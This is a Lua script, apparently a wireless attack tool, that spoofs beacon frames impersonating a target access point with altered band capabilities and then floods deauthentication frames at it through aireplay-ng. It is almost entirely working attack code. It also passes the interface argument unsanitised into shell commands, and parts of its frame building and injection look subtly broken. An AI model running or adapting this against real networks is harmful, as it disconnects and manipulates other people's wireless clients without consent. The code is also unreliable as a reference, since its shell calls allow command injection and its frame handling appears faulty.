local iface = arg[1]
local target_bssid = arg[2]
local target_ssid = arg[3]
local target_band = arg[4] or "2ghz"
local deauth_count = tonumber(arg[5]) or 5

local function json_escape(s)
  return '"' .. tostring(s):gsub('\\', '\\\\'):gsub('"', '\\"'):gsub('\n', '\\n'):gsub('\r', '\\r') .. '"'
end

local function telemetry(event, data)
  local ts = tostring(os.time())
  io.write('{"event":' .. json_escape(event) .. ',"iface":' .. json_escape(iface) .. ',"bssid":' .. json_escape(target_bssid) .. ',"ssid":' .. json_escape(target_ssid) .. ',"channel":"","data":' .. data .. ',"timestamp":' .. json_escape(ts) .. '}\n')
  io.flush()
end

local function check_monitor_mode()
  local cmd = "iw dev " .. iface .. " info 2>/dev/null"
  local f = io.popen(cmd)
  if not f then return false end
  local out = f:read("*a")
  f:close()
  return out:find("type monitor") ~= nil
end

local function mac_to_bytes(mac)
  local bytes = {}
  for b in mac:gmatch("(%x%x)") do
    bytes[#bytes + 1] = tonumber(b, 16)
  end
  return bytes
end

local function build_ht_capabilities_2ghz()
  -- HT Capabilities (tag 45) forcing 2.4GHz only, no 40MHz channels
  local ht = string.char(
    0x01, 0x00, 0x00, 0x00, -- HT capabilities info: 40MHz intolerant, 20MHz only
    0x00, -- A-MPDU params
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, -- MCS set (all zeros)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00 -- Extended capabilities
  )
  local frame = string.char(0x2d, #ht) .. ht
  return frame
end

local function build_vht_capabilities_disabled()
  -- VHT Capabilities (tag 191) with all zeros to indicate no VHT support
  local vht = string.char(
    0x00, 0x00, 0x00, 0x00, -- VHT capabilities info (disabled)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, -- Supported MCS set
    0x00, 0x00, 0x00, 0x00 -- Reserved
  )
  local frame = string.char(0xbf, #vht) .. vht
  return frame
end

local function build_ht_capabilities_5ghz()
  local ht = string.char(
    0x01, 0x02, 0x00, 0x00, -- HT capabilities info: 5GHz, 40MHz support
    0x00,
    0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00
  )
  return string.char(0x2d, #ht) .. ht
end

local function build_band_steering_beacon()
  local frame = string.char(0x80, 0x00)
  frame = frame .. string.char(0x00, 0x00)
  frame = frame .. string.char(0xff, 0xff, 0xff, 0xff, 0xff, 0xff)
  local b = mac_to_bytes(target_bssid)
  for _, v in ipairs(b) do frame = frame .. string.char(v) end
  for _, v in ipairs(b) do frame = frame .. string.char(v) end
  frame = frame .. string.char(0x00, 0x00)
  frame = frame .. string.char(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
  frame = frame .. string.char(0x64, 0x00)
  frame = frame .. string.char(0x31, 0x04)
  local ssid_len = #target_ssid
  if ssid_len > 32 then ssid_len = 32 end
  frame = frame .. string.char(0x00, ssid_len) .. target_ssid:sub(1, ssid_len)
  frame = frame .. string.char(0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24)
  frame = frame .. string.char(0x03, 0x01, 0x01)

  if target_band == "2ghz" then
    frame = frame .. build_ht_capabilities_2ghz()
    frame = frame .. build_vht_capabilities_disabled()
    telemetry("band_mod", '{"action":"disable_5ghz","band":"2.4GHz only"}')
  else
    frame = frame .. build_ht_capabilities_5ghz()
    telemetry("band_mod", '{"action":"advertise_5ghz","band":"5GHz"}')
  end

  local rsn = string.char(
    0x01, 0x00,
    0x00, 0x0f, 0xac, 0x04,
    0x01, 0x00,
    0x00, 0x0f, 0xac, 0x04,
    0x01, 0x00,
    0x00, 0x0f, 0xac, 0x02,
    0x00, 0x00
  )
  frame = frame .. string.char(0x30, #rsn) .. rsn
  frame = frame .. string.char(0x32, 0x04, 0x30, 0x48, 0x60, 0x6c)
  return frame
end

local function build_deauth_frame()
  local frame = string.char(0xa0, 0x00, 0x00, 0x00)
  for b in target_bssid:gmatch("(%x%x)") do
    frame = frame .. string.char(tonumber(b, 16))
  end
  local b = mac_to_bytes(target_bssid)
  for _, v in ipairs(b) do frame = frame .. string.char(v) end
  for _, v in ipairs(b) do frame = frame .. string.char(v) end
  frame = frame .. string.char(0x00, 0x00)
  frame = frame .. string.char(0x07, 0x00)
  return frame
end

local function inject_beacons()
  telemetry("beacon_start", '{"band":' .. json_escape(target_band) .. '}')
  local frame = build_band_steering_beacon()
  local tmp = "/tmp/bandsteer_" .. iface .. ".bin"
  local f = io.open(tmp, "wb")
  if not f then
    telemetry("error", '{"error":"Cannot write temp file"}')
    return false
  end
  for i = 1, 20 do
    f:write(frame)
  end
  f:close()
  os.execute("cat " .. tmp .. " | aireplay-ng -D " .. iface .. " 2>/dev/null")
  telemetry("beacon_done", '{"sent":20}')
  return true
end

local function send_deauth()
  telemetry("deauth_start", '{"count":' .. tostring(deauth_count) .. '}')
  local frame = build_deauth_frame()
  local tmp = "/tmp/bandsteer_deauth_" .. iface .. ".bin"
  local f = io.open(tmp, "wb")
  if not f then return end
  for i = 1, deauth_count do
    f:write(frame)
  end
  f:close()
  os.execute("cat " .. tmp .. " | aireplay-ng -D " .. iface .. " 2>/dev/null")
  telemetry("deauth_done", '{"sent":' .. tostring(deauth_count) .. '}')
end

if not iface or not target_bssid or not target_ssid then
  telemetry("error", '{"error":"Usage: band_steering.lua <iface> <bssid> <ssid> [2ghz|5ghz] [deauth_count]"}')
  os.exit(1)
end

if not check_monitor_mode() then
  telemetry("error", '{"error":"Interface not in monitor mode"}')
  os.exit(1)
end

os.execute("iw dev " .. iface .. " set channel 1 2>/dev/null")
inject_beacons()
send_deauth()
telemetry("complete", '{"action":"band_steering","band":' .. json_escape(target_band) .. '}')
